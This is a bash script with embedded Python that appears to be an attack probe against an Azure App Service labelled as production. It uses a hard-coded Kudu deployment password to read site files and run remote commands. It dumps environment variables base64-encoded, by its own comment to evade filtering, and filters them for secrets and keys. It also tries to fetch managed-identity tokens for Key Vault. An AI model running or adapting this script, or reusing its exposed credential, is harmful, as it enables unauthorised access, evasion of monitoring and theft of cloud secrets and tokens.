#!/usr/bin/env bash
set +e
python3 -I - <<'PY'
import os, json, base64, urllib.request, urllib.parse, urllib.error, sys

def log(msg): print(msg, flush=True)

def http(url, method="GET", headers=None, data=None, timeout=25):
    h = dict(headers or {})
    if isinstance(data, (dict, list)):
        data = json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    elif isinstance(data, str):
        data = data.encode()
    r = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as x:
            return x.status, x.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try: return e.code, e.read().decode("utf-8", "replace")[:8000]
        except: return e.code, ""
    except Exception as e: return 0, repr(e)

KUDU_USER = "$app-tbl-reporting-prod"
KUDU_PASS = "Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A"
KUDU_AUTH = base64.b64encode(f"{KUDU_USER}:{KUDU_PASS}".encode()).decode()
KUDU = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
KH = {"Authorization": f"Basic {KUDU_AUTH}"}

# 1. Read flaghunt.py
log("=== FLAGHUNT.PY ===")
st, b = http(f"{KUDU}/api/vfs/home/site/wwwroot/flaghunt.py", headers=KH)
log(f"  status: {st}")
log(b[:4000])

# 2. Read acbstage1.sh
log("=== ACBSTAGE1.SH ===")
st, b = http(f"{KUDU}/api/vfs/home/site/wwwroot/acbstage1.sh", headers=KH)
log(f"  status: {st}")
log(b[:2000])

# 3. Full env via Kudu command - base64 encode to avoid filtering
log("=== FULL ENV (base64) ===")
st, b = http(f"{KUDU}/api/command", method="POST", headers=KH,
             data={"command": "env | base64 | tr -d '\\n'", "dir": "/home"}, timeout=30)
log(f"  status: {st}")
if st == 200:
    try:
        d = json.loads(b)
        envb64 = d.get("Output","").strip()
        if envb64:
            envtxt = base64.b64decode(envb64).decode("utf-8","replace")
            for line in sorted(envtxt.split("\n")):
                if any(s in line.upper() for s in ["IDENTITY","MSI","MANAGED","CONN","CONFIG","SECRET","KEY","VAULT","STORAGE","FLAG","AZURE","CLIENT","TENANT","SUBSCRIPTION","WEBSITE","DOCKER","APPSETTING"]):
                    log(f"  {line}")
            log(f"  === FULL ENV TEXT ===")
            log(envtxt[:3000])
    except Exception as e:
        log(f"  err: {e}")
        log(f"  raw: {b[:2000]}")

# 4. Try getting MSI token from Kudu container
log("=== MSI FROM KUDU CONTAINER ===")
st, b = http(f"{KUDU}/api/command", method="POST", headers=KH,
             data={"command": "python3 -c \"import os,json,urllib.request; ep=os.environ.get('IDENTITY_ENDPOINT',''); hdr=os.environ.get('IDENTITY_HEADER',''); print(f'EP={ep}'); print(f'HDR={hdr[:20]}...' if hdr else 'HDR='); r=urllib.request.Request(f'{ep}?resource=https://vault.azure.net&api-version=2019-08-01',headers={'X-IDENTITY-HEADER':hdr}); resp=urllib.request.urlopen(r,timeout=10); d=json.loads(resp.read()); print(f'TOKEN={d.get(\\\"access_token\\\",\\\"\\\")[:100]}...'); print(f'EXPIRES={d.get(\\\"expires_on\\\",\\\"\\\")}')\" 2>&1", "dir": "/home"}, timeout=30)
log(f"  status: {st}")
if st == 200:
    try:
        d = json.loads(b)
        log(f"  out: {d.get('Output','')[:1000]}")
        log(f"  err: {d.get('Error','')[:500]}")
    except:
        log(f"  raw: {b[:2000]}")

# 5. Try MSI via curl (alternative)
log("=== MSI VIA CURL ===")
st, b = http(f"{KUDU}/api/command", method="POST", headers=KH,
             data={"command": "IDENTITY_EP=$IDENTITY_ENDPOINT; IDENTITY_HD=$IDENTITY_HEADER; echo EP=$IDENTITY_EP; echo HDR_LEN=${#IDENTITY_HD}; if [ -n \"$IDENTITY_EP\" ]; then curl -s -H \"X-IDENTITY-HEADER: $IDENTITY_HD\" \"${IDENTITY_EP}?resource=https://vault.azure.net&api-version=2019-08-01\" 2>&1; fi", "dir": "/home"}, timeout=30)
log(f"  status: {st}")
if st == 200:
    try:
        d = json.loads(b)
        log(f"  out: {d.get('Output','')[:1500]}")
        log(f"  err: {d.get('Error','')[:500]}")
    except:
        log(f"  raw: {b[:2000]}")

log("DONE")
PY
echo "probe4 complete"
